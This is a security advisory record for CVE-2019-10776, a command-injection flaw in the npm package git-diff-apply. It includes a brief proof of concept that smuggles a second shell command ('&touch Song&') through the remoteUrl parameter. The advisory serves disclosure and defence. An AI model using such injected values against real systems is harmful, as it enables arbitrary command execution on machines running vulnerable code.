---
- id: snykio:npm:git-diff-apply:540774
  title: Command Injection
  description: |
    [git-diff-apply][1] is a package that can be used to reach an unrelated
    remote repository to apply a git diff.

    Affected versions of this package are vulnerable to Command Injection.
    In \"index.js\" file, line 240, the `run` command executes the `git`
    command with an user controlled variable called `remoteUrl`.

    ### PoC by JHU System Security Lab   {#poc-by-jhu-system-security-lab}

        var root = require("git-diff-apply");
        var attack_code = "&touch Song&";
        root({"remoteUrl": "&touch Song&", "startTag": "none"})



    [1]: https://github.com/kellyselden/git-diff-apply
  affected_package: git-diff-apply
  vulnerable_versions:
  - "<0.22.2"
  severity: high
  package_manager: npm
  cve:
  - CVE-2019-10776
  cwe:
  - CWE-78
  disclosed_date: 2020-01-06
  created_date: 2020-01-06
  last_modified_date: 2020-01-06
  credit:
  - JHU System Security Lab
  references:
  - https://github.com/kellyselden/git-diff-apply/commit/106d61d3ae723b4257c2a13e67b95eb40a27e0b5
  source_url: https://snyk.io/vuln/SNYK-JS-GITDIFFAPPLY-540774
